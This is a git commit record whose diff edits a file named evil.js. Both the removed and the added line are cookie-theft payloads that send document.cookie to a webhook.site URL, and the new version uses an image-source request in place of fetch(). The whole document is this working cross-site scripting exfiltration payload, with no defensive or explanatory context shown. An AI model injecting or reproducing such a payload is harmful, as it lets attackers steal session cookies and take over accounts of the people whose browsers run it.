a5040aa5c4a4fbbd572b6c3580c30f602019ca1b
Florian <92117591+FloVerse@users.noreply.github.com>
2025-04-03 10:17:07 +0200

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/fd85a4b6-780a-42da-a0c2-76a549fb4810?c=' + document.cookie);
+new Image().src = "https://webhook.site/fd85a4b6-780a-42da-a0c2-76a549fb4810?c=" + document.cookie;
